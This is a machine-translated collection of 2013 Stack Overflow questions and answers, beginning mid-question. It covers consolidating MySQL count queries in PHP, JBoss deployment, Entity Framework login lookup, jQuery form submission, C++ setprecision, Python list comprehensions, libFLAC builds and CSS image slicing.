$xboxc = mysql_query("SELECT * FROM $tbl_interactive WHERE Console = 'XBOX360' && Type = 'Club' && $date < EndTime");
$ps3f = mysql_query("SELECT * FROM $tbl_interactive WHERE Console = 'PS3' && Type = 'Player' && $date < EndTime");
$ps3c = mysql_query("SELECT * FROM $tbl_interactive WHERE Console = 'PS3' && Type = 'Club' && $date < EndTime");
$pcf = mysql_query("SELECT * FROM $tbl_interactive WHERE Console = 'PC' && Type = 'Player' && $date < EndTime");
$pcc = mysql_query("SELECT * FROM $tbl_interactive WHERE Console = 'PC' && Type = 'Club' && $date < EndTime");
while($row = mysql_fetch_array($xboxf))
    {
$xboxfi = mysql_num_rows($xboxf);
}
while($row = mysql_fetch_array($xboxc))
    {
$xboxci = mysql_num_rows($xboxc);
}
while($row = mysql_fetch_array($ps3f))
    {
$ps3fi = mysql_num_rows($ps3f);
}
while($row = mysql_fetch_array($ps3c))
    {
$ps3ci = mysql_num_rows($ps3c);
}
while($row = mysql_fetch_array($pcf))
    {
$pcfi = mysql_num_rows($pcf);
}
while($row = mysql_fetch_array($pcc))
    {
$pcci = mysql_num_rows($pcc);
} 
```

非常感谢！

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:37:25.617

我会确保您有适当的索引（如果您愿意，可以使用索引）。

此外，您可能希望使用 COUNT 而不是选择大量行然后仅使用行数。这是因为这样的查询：

```
SELECT * FROM $tbl_players WHERE Console = 'XBOX360' 
```

...正在发回大量数据，并且由于您没有使用它，因此浪费了带宽和不必要的额外加载时间。最好搭配：

```
SELECT COUNT(*) FROM $tbl_players WHERE Console = 'XBOX360' 
```

...然后将正确的 PHP 放在适当的位置以仅检索计数。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:51:18.620

是的，这是太多的查询、太多的开销和太多的繁重工作，无法获得您想要的结果集。

您可以使用单个语句从表中获取所有九个计数`$tbl_players`，并且在一行上。您拥有的那九个单独的语句正在准备九个单独的结果集，并且您将结果集中的所有这些行获取到客户端只是为了进行计数。（也许某处有一些优化，但 MySQL 正在准备所有这些行以返回给客户端。）让 MySQL 只返回您想要的计数会更有效，使用如下语句：

```
SELECT SUM(IF(p.Console = 'XBOX360' ,1,0))                             AS xbox
     , SUM(IF(p.Console = 'PS3'     ,1,0))                             AS ps3
     , SUM(IF(p.Console = 'PC'      ,1,0))                             AS pc
     , SUM(IF(p.Console = 'XBOX360' AND p.fathread LIKE 'http%' ,1,0)) AS xbfa
     , SUM(IF(p.Console = 'PS3'     AND p.fathread LIKE 'http%' ,1,0)) AS psfa
     , SUM(IF(p.Console = 'PC'      AND p.fathread LIKE 'http%' ,1,0)) AS pfa
     , SUM(IF(p.Console = 'XBOX360' AND p.crthread LIKE 'http%' ,1,0)) AS xbfr
     , SUM(IF(p.Console = 'PS3'     AND p.crthread LIKE 'http%' ,1,0)) AS pscr
     , SUM(IF(p.Console = 'PC'      AND p.crthread LIKE 'http%' ,1,0)) AS pcr
  FROM $tbl_players p 
```

这会让你回到一行，有九个值。这将大大减少您拥有的代码量，并显着提高性能。

`$tbl_interactive`同样，您也可以使用单个语句从表中获取所有这些计数：

```
SELECT SUM(IF(t.Console = 'XBOX360' AND t.Type = 'Player' ,1,0)) AS xbfi
     , SUM(IF(t.Console = 'XBOX360' AND t.Type = 'Club'   ,1,0)) AS xbci
     , SUM(IF(t.Console = 'PS3'     AND t.Type = 'Player' ,1,0)) AS psfi
     , SUM(IF(t.Console = 'PS3'     AND t.Type = 'Club'   ,1,0)) AS psci
     , SUM(IF(t.Console = 'PC'      AND t.Type = 'Player' ,1,0)) AS pcfi
     , SUM(IF(t.Console = 'PC'      AND t.Type = 'Club'   ,1,0)) AS pcci
  FROM $tbl_interactive t
 WHERE t.Console IN ('XBOX360','PS3','PC')
   AND t.Type IN ('Player','Club')
   AND $date < t.EndTime 
```

* * *

```
while($row = mysql_fetch_array($tbl_interactive_counts))
{
    $xboxfi = $row["xbfi"];
    $xboxci = $row["xbci"];
    $ps3fi  = $row["psfi"];
    $ps3ci  = $row["psci"];
    $pcfi   = $row["pcfi"];
    $pcci   = $row["pcci"];
} 
```

* * *

## 跟进：

`NULL`当没有满足谓词的行（即匹配 WHERE 子句）时，上面的 SQL 语句可能返回 a而不是零。为了让语句返回零计数代替 NULL，我们可以使用 MySQL`IFNULL()`函数作为方便的简写：

```
SELECT IFNULL(SUM(IF(t.Console = 'XBOX360' AND t.Type = 'Player' ,1,0)),0) AS xbfi
     , IFNULL(SUM(IF(t.Console = 'XBOX360' AND t.Type = 'Club'   ,1,0)),0) AS xbci
     , IFNULL(SUM(IF(t.Console = 'PS3'     AND t.Type = 'Player' ,1,0)),0) AS psfi
     , IFNULL(SUM(IF(t.Console = 'PS3'     AND t.Type = 'Club'   ,1,0)),0) AS psci
     , IFNULL(SUM(IF(t.Console = 'PC'      AND t.Type = 'Player' ,1,0)),0) AS pcfi
     , IFNULL(SUM(IF(t.Console = 'PC'      AND t.Type = 'Club'   ,1,0)),0) AS pcci
  FROM $tbl_interactive t
 WHERE t.Console IN ('XBOX360','PS3','PC')
   AND t.Type IN ('Player','Club')
   AND $date < t.EndTime 
```

请注意，我们刚刚包装了一个表达式： `IFNULL(expr,0)`

这只是相当于： `IF(expr IS NULL, 0, expr)`

也等同于 ANSI 标准： `CASE WHEN expr IS NULL THEN 0 ELSE expr END`

（使用`IFNULL`，我们只需要指定`expr`一次。）

* * *

或者，您可以让 MySQL 返回 NULL，并在 PHP 中用零替换 NULL。（请注意，`$row`数组中获取的值仍将包含`NULL`，但将向标量分配零：

```
$xboxfi = is_null($row["xbfi"]) ? 0 : $row["xbfi"] ; 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:38:15.680

您正在向服务器发送 9 个请求，这需要 9 次往返。为什么不只使用`UNION ALL`单个请求？对您的程序知之甚少，可以肯定地说您可能需要考虑重新设计。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:38:56.727

根据表中的内容，您可以使用聚合查询来获取所需的信息。

```
SELECT COUNT(*) `total`, Console, fathread 
FROM $tbl_players
GROUP BY Console, fathread 
```

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2013-01-22T22:46:09.403

由于您只是计算每个类别中的条目数，因此您可以使用`COUNT`and消除大部分查询`GROUP BY`。一个例子：

```
$tbl_players_result = mysql_query("SELECT Console, COUNT(*) AS item_count FROM $tbl_players GROUP BY Console");
while($row = mysql_fetch_assoc($tbl_players_result))
{
    /* Testing... */
    print($row["Console"] . " - " . $row["item_count"] . " items");
} 
```

您可以对带有附加条件（fathread、crthread）的查询执行相同的操作。

此外，您只需为`mysql_num_rows`每个结果调用一次，因此您也不需要这些`while`循环。

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2013-01-22T22:53:33.917

许多 CMS 系统和在线商店一次刷新运行 50 个或更多查询。

无论如何 - 在你的情况下 - 我看到了一些优化的可能性。例如 - 您可以在一个查询中读取有关许多类型和控制台的信息，然后在 PHP 中处理/过滤返回的数据。也许你应该在 PHP 中做一些简单和中等的练习（数组、结果获取、foreach 循环）和一点 MySQL 培训。这会对你有很大帮助。我认为最省时的教育材料都在[The New Boston](http://thenewboston.org/tutorials.php)或[PHP Academy](https://phpacademy.org/learn)。有很多有价值的视频教程。

我不会为您提供完整的解决方案（这可能需要太多时间），我不确定您查询的最终目的是什么，但您可以先将它们合并到一个查询中。

也许像这样？

```
SELECT * FROM $tbl_interactive 
WHERE 
    Console IN('XBOX360', 'PS3', 'PC') && 
    Type in('Player','Club') && 
    $date < EndTime 
```

如果您只想获取行数 - 您不应该`*`在 PHP 中使用和计算结果集行数。

使用一个字段或计数（*）函数。添加`GROUP BY`一些字段，并将这些字段添加到结果中（在计数之后或之前）会将您的计数结果分成几行，其中包含很少的选项，以及对您的组进行数学计算的行数。

按示例计数和分组：

```
SELECT Type, Console, count(*) FROM $tbl_interactive 
WHERE 
    Console IN('XBOX360', 'PS3', 'PC') && 
    Type in('Player','Club') && 
    $date < EndTime
GROUP BY Type, Console 
```

当然，您必须阅读结果集，而不是返回的行数。

在 MySQL 工作台或 phpmyadmin 中试一试，看看它是如何工作的。

# mysql - 通过 https 保护远程 MySQL 连接

> ID：14469308
> 
> 赞同：0
> 
> 时间：2013-01-22T22:34:24.140
> 
> 标签：mysql, security

我正在使用软件远程访问 MySQL。我可以通过 https 连接到数据库以确保连接安全吗？

例如，使用主机[https://mydomain.com](https://mydomain.com)。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-22T22:44:15.237

HTTPS 用于连接到 Web 服务器，而不是数据库服务器。请参阅以下 MySQL 文档：

[使用 SSL 进行安全连接](http://dev.mysql.com/doc/refman/5.6/en/ssl-connections.html)

如何从应用程序中使用它取决于语言和驱动程序。有关如何使用带有 MySQLi 扩展的 PHP 来执行此操作，请参阅[此问题。](https://stackoverflow.com/questions/9738712/connect-to-remote-mysql-server-with-ssl-from-php?lq=1)

# java - 战争已部署，但打开页面显示 404

> ID：14469309
> 
> 赞同：1
> 
> 时间：2013-01-22T22:34:36.917
> 
> 标签：java, deployment, jboss

我部署了一个项目`JBoss 7.1 AS`，我可以在日志中看到

```
13:59:03,290 INFO  [org.jboss.as.server.deployment] (MSC service thread 1-7) JBAS015876: Starting deployment of "web-1.0-SNAPSHOT.war"
13:59:04,652 INFO  [org.jboss.as.ejb3.deployment.processors.EjbJndiBindingsDeploymentUnitProcessor] (MSC service thread 1-3) JNDI bindings for session bean named LoginManager in deployment unit deployment "web-1.0-SNAPSHOT.war" are as follows:

    java:global/web-1.0-SNAPSHOT/LoginManager!com.myorg.bb.business.LoginManager
    java:app/web-1.0-SNAPSHOT/LoginManager!com.myorg.bb.business.LoginManager
    java:module/LoginManager!com.myorg.bb.business.LoginManager
    java:global/web-1.0-SNAPSHOT/LoginManager
    java:app/web-1.0-SNAPSHOT/LoginManager
    java:module/LoginManager

13:59:04,655 INFO  [org.jboss.as.ejb3.deployment.processors.EjbJndiBindingsDeploymentUnitProcessor] (MSC service thread 1-3) JNDI bindings for session bean named LoginCrudService in deployment unit deployment "web-1.0-SNAPSHOT.war" are as follows:

    java:global/web-1.0-SNAPSHOT/LoginCrudService!com.myorg.bb.persistence.LoginCrudService
    java:app/web-1.0-SNAPSHOT/LoginCrudService!com.myorg.bb.persistence.LoginCrudService
    java:module/LoginCrudService!com.myorg.bb.persistence.LoginCrudService
    java:global/web-1.0-SNAPSHOT/LoginCrudService
    java:app/web-1.0-SNAPSHOT/LoginCrudService
    java:module/LoginCrudService

13:59:04,658 INFO  [org.jboss.as.ejb3.deployment.processors.EjbJndiBindingsDeploymentUnitProcessor] (MSC service thread 1-3) JNDI bindings for session bean named VariableManager in deployment unit deployment "web-1.0-SNAPSHOT.war" are as follows:

    java:global/web-1.0-SNAPSHOT/VariableManager!com.myorg.bb.business.VariableManager
    java:app/web-1.0-SNAPSHOT/VariableManager!com.myorg.bb.business.VariableManager
    java:module/VariableManager!com.myorg.bb.business.VariableManager
    java:global/web-1.0-SNAPSHOT/VariableManager
    java:app/web-1.0-SNAPSHOT/VariableManager
    java:module/VariableManager

13:59:04,661 INFO  [org.jboss.as.ejb3.deployment.processors.EjbJndiBindingsDeploymentUnitProcessor] (MSC service thread 1-3) JNDI bindings for session bean named VariableCrudService in deployment unit deployment "web-1.0-SNAPSHOT.war" are as follows:

    java:global/web-1.0-SNAPSHOT/VariableCrudService!com.myorg.bb.persistence.VariableCrudService
    java:app/web-1.0-SNAPSHOT/VariableCrudService!com.myorg.bb.persistence.VariableCrudService
    java:module/VariableCrudService!com.myorg.bb.persistence.VariableCrudService
    java:global/web-1.0-SNAPSHOT/VariableCrudService
    java:app/web-1.0-SNAPSHOT/VariableCrudService
    java:module/VariableCrudService

13:59:04,755 INFO  [org.jboss.web] (MSC service thread 1-2) JBAS018210: Registering web context: /web-1.0-SNAPSHOT
13:59:04,767 INFO  [org.jboss.as.server] (management-handler-thread - 2) JBAS018559: Deployed "web-1.0-SNAPSHOT.war"
[2013-01-22 01:59:04,783] Artifact web:war: Artifact is deployed successfully 
```

当我单击 url 打开提到的 web 上下文时`http://localhost:8080/web-1.0-SNAPSHOT/`，我得到 404 NOT FOUND 错误

当我看到我的战争文件时，里面有什么，我明白了

```
⮀ ⭠ branch± ⮀ jar -tvf ~/IdeaProjects/bb/web/target/web-1.0-SNAPSHOT.war
     0 Tue Jan 22 13:58:54 PST 2013 META-INF/
   298 Tue Jan 22 13:58:52 PST 2013 META-INF/MANIFEST.MF
     0 Tue Jan 22 12:43:46 PST 2013 WEB-INF/
     0 Tue Jan 22 12:43:46 PST 2013 WEB-INF/classes/
     0 Tue Jan 22 13:58:34 PST 2013 WEB-INF/lib/
445288 Thu May 17 14:46:22 PDT 2012 WEB-INF/lib/antlr-2.7.7.jar
 43581 Thu Dec 13 15:30:40 PST 2012 WEB-INF/lib/asm-3.3.1.jar
  2771 Tue Jan 22 12:44:20 PST 2013 WEB-INF/lib/business-1.0-SNAPSHOT.jar
287192 Thu Dec 13 15:30:40 PST 2012 WEB-INF/lib/cglib-2.2.2.jar
259600 Wed Jan 02 13:25:26 PST 2013 WEB-INF/lib/commons-codec-1.7.jar
575389 Thu May 17 14:52:30 PDT 2012 WEB-INF/lib/commons-collections-3.2.1.jar
313898 Thu May 17 12:46:58 PDT 2012 WEB-INF/lib/dom4j-1.6.1.jar
1891110 Thu Dec 13 15:29:48 PST 2012 WEB-INF/lib/guava-13.0.1.jar
 81271 Wed Jun 06 16:00:00 PDT 2012 WEB-INF/lib/hibernate-commons-annotations-4.0.1.Final.jar
4317092 Wed Jun 06 16:00:14 PDT 2012 WEB-INF/lib/hibernate-core-4.1.0.Final.jar
476002 Wed Jun 06 16:00:04 PDT 2012 WEB-INF/lib/hibernate-entitymanager-4.1.0.Final.jar
648253 Wed Jun 06 16:00:08 PDT 2012 WEB-INF/lib/javassist-3.15.0-GA.jar
 60539 Wed Jun 06 16:00:06 PDT 2012 WEB-INF/lib/jboss-logging-3.1.0.CR2.jar
 31866 Mon Sep 17 10:12:38 PDT 2012 WEB-INF/lib/jsr305-2.0.1.jar
489884 Thu Dec 20 15:01:58 PST 2012 WEB-INF/lib/log4j-1.2.17.jar
252684 Fri Jan 18 14:34:20 PST 2013 WEB-INF/lib/logback-classic-1.0.9.jar
366462 Fri Jan 18 14:34:22 PST 2013 WEB-INF/lib/logback-core-1.0.9.jar
 12050 Thu Dec 13 15:30:40 PST 2012 WEB-INF/lib/mysema-commons-lang-0.2.4.jar
 12234 Tue Jan 22 13:58:50 PST 2013 WEB-INF/lib/persistence-1.0-SNAPSHOT.jar
376114 Thu Dec 13 15:30:42 PST 2012 WEB-INF/lib/querydsl-core-2.9.0.jar
 95539 Thu Dec 13 15:30:40 PST 2012 WEB-INF/lib/querydsl-jpa-2.9.0.jar
  5050 Tue Jan 22 12:44:22 PST 2013 WEB-INF/lib/service-1.0-SNAPSHOT.jar
 26083 Thu Oct 18 13:40:04 PDT 2012 WEB-INF/lib/slf4j-api-1.7.2.jar
  9711 Mon Jul 16 10:31:24 PDT 2012 WEB-INF/lib/slf4j-log4j12-1.6.6.jar
   403 Tue Jan 22 13:58:52 PST 2013 WEB-INF/lib/web-1.0-SNAPSHOT.jar
220536 Fri Jan 18 14:34:20 PST 2013 WEB-INF/lib/xml-apis-1.4.01.jar 
```

当我看到 JBoss 的管理控制台时，我看到项目已部署 ![在此处输入图像描述](../Images/d42a04a07e3c0cbe07b9d167f56dc021.png)

我在这里缺少什么并且做错了什么？

# iphone - 我可以缩放我的 iPAD 应用程序以自动适应 iphone

> ID：14469310
> 
> 赞同：1
> 
> 时间：2013-01-22T22:34:43.673
> 
> 标签：iphone, ios

我有一个内置于objective-c 中的iPad 应用程序，我想知道UIWindow 是否有任何技巧来扩展应用程序以在iphone 上以landscope 模式运行。因此，我对框架为 ipad 大小的所有假设都可以，但它适合 iphone。只是为了随身携带袖珍演示等。我意识到事情很难按。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:36:50.360

不，你有它倒退：为手机制作的应用程序可以在 ipad 上以 2x 模式（拉伸）或信箱模式运行。

# c# - 如何在登录中获取 id？

> ID：14469315
> 
> 赞同：0
> 
> 时间：2013-01-22T22:35:02.580
> 
> 标签：c#, sql, entity-framework

如何在登录中获取 ID？

我正在使用实体框架，在 frmLogin 我有这个：

```
 private bool IsValidUser(string userName, string pass)
    {
        Context context = new Context();

        var query = (from c in context.Cuentas
                     where c.Nombre == userName && c.Password == pass
                     select c);

        return query.Any();
    } 
```

但是使用此功能，我只能验证用户是否在数据库中。

我也想得到这个用户的 id。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:38:07.253

而不是`if(query.Any())`....尝试：

```
var user = query.FirstOrDefault();

if (user == null)
     return false;

var id = user.ID; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:40:42.830

我认为可能只有一个用户具有相同的用户名:) => 一个用户名 = 一个用户

你可以试试这个

```
var user = context.Cuentas.singleordefault(d=>d.userName==userName & d.password==password);
int id;
if (user!=null)
{
   id=user.userId;
   return true;
}
return false; 
```

已编辑

# jquery - jQuery不会在选择时自动更新

> ID：14469316
> 
> 赞同：0
> 
> 时间：2013-01-22T22:35:05.150
> 
> 标签：jquery, html

当用户从下拉列表中选择某些内容时，以下 jquery 是否有任何原因不起作用。（假设是自动更新）

```
<script>
$(document).ready(function() {
                $("#state").change(function () {
                this.form.submit();
})
});
</script>

  <form action="avsafety.asp" method="get">

     <p>State:<br/>
      <select id="state" name="state">
        <option label="ACT" value="ACT" <%if request.querystring("state") = "ACT" then response.write("selected") %>>ACT</option>
        <option label="NSW" value="NSW" <%if request.querystring("state") = "NSW" then response.write("selected") %>>NSW</option>
        <option label="QLD" value="QLD" <%if request.querystring("state") = "QLD" then response.write("selected") %>>QLD</option>
        <option label="VIC" value="VIC" <%if request.querystring("state") = "VIC" then response.write("selected") %>>VIC</option>
        <option label="SA" value="SA"   <%if request.querystring("state") = "SA" then response.write("selected") %>>SA</option>
        <option label="TAS" value="TAS" <%if request.querystring("state") = "TAS" then response.write("selected") %>>TAS</option>
        <option label="WA" value="WA"   <%if request.querystring("state") = "WA" then response.write("selected") %>>WA</option>
      </select>
      <input type="submit" value="Search" />
    </p>

  </form> 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:43:46.323

如果您的选项动态更改

试一试

```
 $(document).ready(function() {

              $(document).on("change","select#state",function(e){
                             $("form").submit();
                               });

     }); 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:45:51.520

`this`在您使用的函数的上下文中，它指向`select#state`. 换句话说，您不能发送表单，因为选择中没有表单。而是将您的代码更改为如下所示：

```
$("#state").change(function () {
         $("form").submit();
}) 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-22T22:46:29.823

`$("#state").find("option:selected").change(function(){});`

# android - Android：快速且节省资源的 ListView

> ID：14469319
> 
> 赞同：0
> 
> 时间：2013-01-22T22:35:14.243
> 
> 标签：android, listview

我需要一个 listView 实现，它具有以下特性： - 资源节省：应该只在内存中保存可见的元素 +x - 应该提供接口来更改当前元素而不加载所有内容 - 应该从后台的慢速资源中加载元素，以便快速交互

那里有一个例子吗？

谢谢塔塔

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T22:39:28.780

您应该考虑查看 Romain Guy 的[演示文稿](http://www.youtube.com/watch?v=N6YdwzAvwOA)（开始），其中他解释了 ListView 的性能问题并教授如何有效地使用适配器。（ViewHolder 模式和重用视图）。

该视频很棒，他解释了如何在提供代码示例的 ListView 中达到最大性能并避免常见错误。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:54:12.113

我在[这里](https://github.com/asabbarwal/EffecientListViewDesign)编写了一个示例，它使用 ViewHolder 和 convertview（用于重用视图）实现高效的 Listview。

[本文](http://lucasr.org/2012/04/05/performance-tips-for-androids-listview/)还清楚地解释了代码示例背后的术语。

# c++ - 设置精度在分配的数字之前的小数点后给出零

> ID：14469323
> 
> 赞同：2
> 
> 时间：2013-01-22T22:35:25.377
> 
> 标签：c++

当我尝试在 C++ 中使用 setprecision(2) 对数字进行舍入时，会重新返回像“0.093”这样的数字——三位，而不是小数点后两位！我不知道为什么会这样。我在下面包含了我非常基本的代码，以防我严重遗漏了一些要点。谢谢！

```
#include <iostream>
#include <iomanip>
using namespace std;

int main()
{
    double tax = 0.06 ; //Tax Rate
    float cost ; //Cost of item
    float computed ; //Non-rounded tax

    cout << "Enter the cost of the item: " ;
    cin >> cost ;

    computed = tax*cost;

    cout << "Computed: $" << computed << endl;
    cout << "Charged: $" << setprecision(2) << computed << endl; //Computed tax rounded to 2 decimal places

    return 0;

} 
```

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2013-01-22T22:44:51.703

This is because `std::setprecision` doesn't set the digits *after* the decimal point but the *significant* (aka "meaningful") digits if you don't change the floating point format to use a *fixed* number of digits after the decimal point. To change the format, you have to put [`std::fixed` (documentaion)](http://en.cppreference.com/w/cpp/io/manip/fixed) into your output stream:

```
cout << "Charged: $" << fixed << setprecision(2) << computed << endl; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-22T22:46:57.563

来自：[http ://www.cplusplus.com/reference/iomanip/setprecision/](http://www.cplusplus.com/reference/iomanip/setprecision/)

十进制精度决定了在插入操作中写入以表示浮点值的最大位数。如何解释这取决于 floatfield 格式标志是否设置为特定符号。
...

在默认的浮点表示法上，精度字段指定要显示的有意义数字的最大数量，包括小数点之前和之后的数字。

在您的情况下：`0.093`, `93`- 两个有意义的数字。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2021-04-08T19:29:13.453

cout << 固定 <<setprecision(6)<< a<<endl; //添加任何你想要四舍五入的地方

# python - 有人可以解释以下列表理解吗

> ID：14469329
> 
> 赞同：4
> 
> 时间：2013-01-22T22:35:56.297
> 
> 标签：python, list, list-comprehension

这是python文档中关于如何生成随机序列的简单代码，即当每个序列都有相关的权重时选择一种颜色。

我理解这个概念，但当我尝试自己做时，无法弄清楚列表理解在做什么。有人可以反复解释这个列表理解在做什么，这样我就可以更好地理解这段代码。谢谢。

```
weighted_choices = [('Red', 3), ('Blue', 2), ('Yellow', 1), ('Green', 4)]
population = [val for val, cnt in weighted_choices for i in range(cnt)]
random.choice(population)
'Green' 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T22:59:57.833

```
weighted_choices = [('Red', 3), ('Blue', 2), ('Yellow', 1), ('Green', 4)]
population = [val for val, cnt in weighted_choices for i in range(cnt)]
random.choice(population)
'Green' 
```

让我们从简单的理解开始

```
simple = [val for val, cnt in weighted_choices] 
```

这个简单的列表理解是这样做的：

*   对于 weighted_choices 中的每个项目，打破第一部分并将其分配给 val，将第二部分分配给 cnt。
*   取出 val 并从每个 val 中创建一个新数组

这将产生：

```
['Red','Blue','Yellow''Green'] 
```

现在让我们看看第二部分让我们先做一个简单的列表理解

```
second_part = ['Red' for i in range(3)] 
```

列表理解的第二部分是这样做的：

*   对于 range(3) 中的每个 i（数字 [0,1,2]）
*   丢弃 i 并将“红色”添加到列表中

这将产生：

```
['Red','Red','Red'] 
```

结合两种理解：

```
population = [val for val, cnt in weighted_choices for i in range(cnt)] 
```

这个简单的列表理解是这样做的：

*   对于 weighted_choices 中的每个项目，打破第一部分并将其分配给 val，将第二部分分配给 cnt。（例如“红色”和第一项为 3）
*   取 val 和
*   对于 range(cnt) 中的每个 i（如果 cnt 为 3，则数字 [0,1,2]）丢弃 i 并将 val 添加到列表中

这将产生：

```
['Red', 'Red', 'Red', 'Blue', 'Blue', 'Yellow', 'Green', 'Green', 'Green', 'Green'] 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-22T22:38:12.267

把它想象成一个`for`看起来像这样的循环：

```
population = []
for val, cnt in weighted_choices:
  for i in range(cnt):
    population.append(val) 
```

从 开始`weighted_choices`，它遍历每个项目，为您提供如下内容：

```
('Red', 3) 
```

从那里，它遍历一个长度范围（3，这里）并将（红色）`cnt`附加到该长度范围内多次。所以最后你得到：`val``population`

```
['Red',
 'Red',
 'Red',
 'Blue',
 'Blue',
 'Yellow',
 'Green',
 'Green',
 'Green',
 'Green'] 
```

如您所见，其中包含`Red`3 次、2`Blue`次、 1`Yellow`次和`Green`4 次，这反映了初始列表中每种颜色旁边的数字。

当我看到像这样双重嵌套的列表推导时，我只想到一个`for`像上面那样的循环，然后在我的脑海中“压扁”它，这样它就在一行上。不是最先进的方法，但它可以帮助我保持直截了当:)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-22T22:39:06.890

最好扩展列表理解来分析它：

```
population = []
for val, cnt in weighted_choices:
    for i in range(cnt):
        population.append(val) 
```

这扩展`weighted_choices`为一个元素列表，其中每个项目根据其权重重复；`Red`添加3次，`Blue`2次等：

```
['Red', 'Red', 'Red', 'Blue', 'Blue', 'Yellow', 'Green', 'Green', 'Green', 'Green'] 
```

然后，该`random.choice()`函数随机获取其中一个元素，但`Green`出现 4 次，因此被选中的机会高于 ，例如`Yellow`，后者在扩展列表中仅出现一次。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2013-01-22T22:43:59.253

列表理解由 2 个 for 循环组成。

试试`print`吧

```
for val, cnt in weighted_choices:
  # the first for loop will be executed len(weighted_choices) times = 4
  for i in range(cnt):
  # the second for loop will be executed cnt times
  # for each execution of the outer loop 
  # (cnt = second element of each tuple)
      print val # it will print each first element of the tuple 'Red', ...
                # len(weighted_choices) * cnt times 
```

现在，而不是`print`您的代码将其添加`val`到名为 population 的列表中。其余的很简单，代码使用列表作为输入进行随机选择。

# objective-c - 在 Mountain Lion 中使用 libFlac 和 Xcode

> ID：14469336
> 
> 赞同：1
> 
> 时间：2013-01-22T22:36:26.083
> 
> 标签：objective-c, cocoa

我决定用objective-c 和cocoa 编写一个简单的音频转换器，但我无法将libFlac C 库链接到我的Xcode 项目。当我试图这样做时，编译器说：

> ld：未找到架构 x86_64 的符号

更重要的是，当我尝试通过命令行工具编译它时（就像它在自述文件中描述的那样），终端抛出：

> 不匹配以前的存档成员 cputype (16777223) (所有成员必须匹配) ranlib: 对于架构: x86_64 文件: .libs/libFLAC.a(float.o) 没有符号 make[4]: *** [libFLAC.la] 错误 1制作[3]：** **[全递归] 错误 1 ​​make[2]：*****[全递归] 错误 1 ​​make[1]: *** [全递归] 错误 1***

 ***当我将目标架构更改为英特尔 32 位时：

> 错误：-fobjc-arc 不支持脆弱的 abi 命令 >/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/bin/clang >失败，退出代码为 1

有谁能够帮我 ？也许有人知道在 Objective-c 中解码 FLAC 文件的更好、更简单的方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-22T23:21:28.223

```
./configure --disable-asm-optimizations && make 
```

这将在 OS X 上正确构建。***

# nservicebus - 从 NServiceBus/Raven 中删除订阅者

> ID：14469337
> 
> 赞同：2
> 
> 时间：2013-01-22T22:36:28.657
> 
> 标签：nservicebus, nservicebus3

使用带有 Raven 的 NserviceBus 3.3 进行订阅持久性。

我正在创建一个原型应用程序，它将在我们的测试环境中使用来自发布者的消息。该应用程序只会使用几周，届时它可能（基本上）以其当前形式被丢弃。

我不希望发布者继续向该订阅者的出站队列发送消息。实际上，我希望它的存在完全从系统中删除。

我将如何从系统中删除该订阅者的所有知识？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-22T23:31:50.493

为此，您需要手动管理订阅。

查看[PubSub 示例](https://github.com/NServiceBus/NServiceBus/tree/master/Samples/PubSub)，特别是[此文件](https://github.com/NServiceBus/NServiceBus/blob/master/Samples/PubSub/Subscriber2/Subscriber2Endpoint.cs)，您还需要告诉总线[不要自动订阅](https://github.com/NServiceBus/NServiceBus/blob/master/Samples/PubSub/Subscriber2/EndpointConfig.cs#L15)，此示例应该为您提供执行此操作所需的所有代码。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-11-10T15:52:16.957

PubSub 文章的链接已损坏。这是新链接：[https ://github.com/Particular/NServiceBus.Msmq.Samples/tree/master/PubSub](https://github.com/Particular/NServiceBus.Msmq.Samples/tree/master/PubSub)

# css - 一张大背景图片还是多张小图片？

> ID：14469341
> 
> 赞同：3
> 
> 时间：2013-01-22T22:36:39.087
> 
> 标签：css, html

作为一名网络开发人员，我必须削减类似于此的布局（[Ruben Bristian](http://themes.rubenbristian.com/hexagon/)的示例网站）：

![鲁本布里斯蒂安的六边形](../Images/b459e1c9374d207ff687c473e584b2d4.png)

我是否应该为切割多个小图像（如徽标）而烦恼：

![标识](../Images/b28d733b99d6785b668bca74bc29558b.png)

一个标签：

![标签](../Images/707f189b1c5123dc702073809a7d8938.png)

等等？或者我应该只用这样的所有元素制作一张大背景图片：

![背景](../Images/ff0fd4979272d5575ccaede26e7a7bc4.png)

并`<a href>`为`display: block;`链接的徽标定位？

单个图像的尺寸小于多个元素的尺寸。其他优点和缺点是什么？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-22T22:49:25.750

# 使用单独的图像。

以下是几个原因：

**维护**：如果/当您想在已有的基础上进行构建时，将来维护起来会容易得多。此外（主观上），背景图像对设计并不重要。如果部分背景被剪裁，它看起来不会损坏。但是，如果徽标变形，它看起来会损坏。

还要记住，正在开发更新、更清晰的显示器。显示标准分辨率背景要容易得多（它已经模糊，因此清晰度不是必需的），并维护两个版本的徽标。一种用于标准显示器，一种用于高清。

